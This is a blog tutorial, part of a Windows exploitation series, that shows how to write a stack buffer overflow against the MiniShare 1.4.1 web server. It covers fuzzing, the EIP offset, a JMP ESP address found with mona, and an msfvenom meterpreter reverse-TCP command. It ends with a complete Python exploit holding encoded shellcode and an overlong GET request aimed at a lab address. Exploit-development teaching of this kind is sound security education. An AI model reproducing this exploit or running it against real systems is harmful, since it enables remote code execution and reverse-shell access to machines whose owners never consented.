---
layout: post
title:  "Windows Exploitation Part II"
date:   2020-1-1 00:02:00 +0000
categories: Windows-Exploitation
---
# Windows Exploitation Part II - Writing a Standard Stack Buffer Overflow



# Bull by the horns in theory
In this part ill be working through how we can achieve code execution by overwriting crucial application pointers in memory. We know from the previous part that EIP is our Extended Instruction Pointer. 
This pointer is what is used by applications to keep track of the next instruction to be executed. Due to this, we can steer the application ourself if we overwrite this. 

# Setup

When testing and creating exploits like this i choose to run an extra windows vm to serve as a host to the program and debugger alongside the linux vm where ill work from.
My windows 7 VM is x86 based with immunity debugger and the mona.py plugin. The linux platform can vary as long as it has the ability to communicate with the windows machine.
For this instance, we will be testing the vulnerable 'Minishare 1.4.1' application.
# Testing the application 
I mentioned that ill be using immunity with the mona.py plugin. Mona is a plugin for immunity and other windows based debuggers that simplifies the exploitaiton process. Ill have a link listed later on how to get it installed.

# Fuzzing + skeleton
Fuzzing is a method of sending an application data intended to crash the application. For overflows like this, we will need to fuzz the application to get it to crash in order to determine the memory offset to EIP. I will probably write up later how to use an actual framework for fuzzing like spike or afl but for now we can just create a basic fuzzer in python.

# Determining the offset to EIP


A basic skeleton would look something like this;
{% highlight python %}
import socket
rhost=
rport=
offset=
jmpesp=

payload=
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost,rport))
s.send(payload)
print "[!] Sent"
s.close
{% endhighlight %}
This particular basic skeleton uses the socket library to send our payload to the host. For this use, i either use sockets like this or the pwntools library as it has abilities similar to socket and struct built in.

# Finding our jump address
This is actually a simple step due to the addition of the mona plugin. We can use it to directly search for our instruction 'JMP ESP' which translates to 'FFE4' in hex. Its also important that there are several instructions that will do what we need, not just JMP ESP. Ill try cover the rest and differences later.

```
!mona find -s "\xFF\xE4"
```


Once we have found our JMP ESP addresses, we should take note and start building our exploit.
# Writing our exploit

# Shellcode
Shellcode is a small piece of code used in our exploit to achieve code execution. It is made up of raw bytes that will be executed from memory. For this example we will be creating some to return us a shell.

We can generate our shellcode with msfvenom with something like the following:
```
msfvenom -p windows/meterpreter/reverse_tcp -b "\x00\x0a\x0d" -f python

-p = payload > windows based meterpreter with reverse tcp payload
	> due to meterpreter, we can use metasploit as a listener
-b = bad chars > characters we need to remove for the payload to work
	> 0x00 = null byte 0x0a/0x0d = CRLF
-f = format > since were using python to send the payload this should work 
```

# Nop sled
In assembly, '0x90' is a NO-Operation, basically 'do nothing'. We can use a small sum of these instructions as a precaution incase our jump instruction is off by a few bytes.
We add the nops before our shellcode so in the event that the jump is off, we hit the nops and simply do nothing until we hit our shellcode. 
```
Current instruction
  |				Shellcode executes
  V ---->			 --V
\x90\x90\x90\x90\x90\x90\x90\x90\[shellcode]
```
Usually we dont need more than a few nops, a word or dword is usually sufficient.


# Final steps
Now that weve created and found all the relevent values for our exploit we just need to piece them together in to a file we can execute for ease of use. 

Our final exploit:
{% highlight python %}
# imports socket library for socket communication
import socket
# stored variables for remote host connection
rhost = '192.168.9.147'
rport = 80
# added nopsled for padding
nops = "\x90" *20
# msfvenom shellcode
shellcode = ("\xb8\xb5\xcc\x15\x37\xdb\xc2\xd9\x74\x24\xf4\x5b"
"\x33\xc9\xb1\x31\x31\x43\x13\x03\x43\x13\x83\xeb"
"\x49\x2e\xe0\xcb\x59\x2d\x0b\x34\x99\x52\x85\xd1"
"\xa8\x52\xf1\x92\x9a\x62\x71\xf6\x16\x08\xd7\xe3"
"\xad\x7c\xf0\x04\x06\xca\x26\x2a\x97\x67\x1a\x2d"
"\x1b\x7a\x4f\x8d\x22\xb5\x82\xcc\x63\xa8\x6f\x9c"
"\x3c\xa6\xc2\x31\x49\xf2\xde\xba\x01\x12\x67\x5e"
"\xd1\x15\x46\xf1\x6a\x4c\x48\xf3\xbf\xe4\xc1\xeb"
"\xdc\xc1\x98\x80\x16\xbd\x1a\x41\x67\x3e\xb0\xac"
"\x48\xcd\xc8\xe9\x6e\x2e\xbf\x03\x8d\xd3\xb8\xd7"
"\xec\x0f\x4c\xcc\x56\xdb\xf6\x28\x67\x08\x60\xba"
"\x6b\xe5\xe6\xe4\x6f\xf8\x2b\x9f\x8b\x71\xca\x70"
"\x1a\xc1\xe9\x54\x47\x91\x90\xcd\x2d\x74\xac\x0e"
"\x8e\x29\x08\x44\x22\x3d\x21\x07\x28\xc0\xb7\x3d"
"\x1e\xc2\xc7\x3d\x0e\xab\xf6\xb6\xc1\xac\x06\x1d"
"\xa6\x53\xe5\xb4\xd2\xfb\xb0\x5c\x5f\x66\x43\x8b"
"\xa3\x9f\xc0\x3e\x5b\x64\xd8\x4a\x5e\x20\x5e\xa6"
"\x12\x39\x0b\xc8\x81\x3a\x1e\xab\x44\xa9\xc2\x02"
"\xe3\x49\x60\x5b")
# Overflow occurs in long GET request.
buffer = "GET "
#buffer +="\x41" *2000
#buffer += "\x41"*1787 + "\x42" *4 # lands us at 42424242 
#buffer += "\x41" * 1787 + "\x42" * 4 + "\x43" * (2000-1787-4)
buffer += "\x41" * 1787 + "\xDF\x19\x2D\x77" + nops +  shellcode + "\x43" * (2000-1787-4)
buffer +=" HTTP/1.1\r\n\r\n"
# Socket setup and sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[!] Sending payload"
s.connect((rhost,rport))
print "[!] Sent"
s.send(buffer)
s.close

{% endhighlight %}


# Extra References
[Getting started with mona](link)
[Corelan Overflow paper](link)
[Minishare download](link)
[Extra Bof practice binaries](link)

# Next
The next part will focus on dealing with the windows Structured Exception Handler or SEH when writing stack based buffer overflows. 

<br>
Windows Exploitation:
[I](/windows-exploitation/2020/1/1/WinExplP1.html)	[II](/windows-exploitation/2020/1/1/WinExplP2.html)	[III](/windows-exploitation/2020/1/1/WinExplP3.html)	[IV](/windows-exploitation/2020/1/1/WinExplP4.html)	[V](/windows-exploitation/2020/1/1/WinExplP5.html)
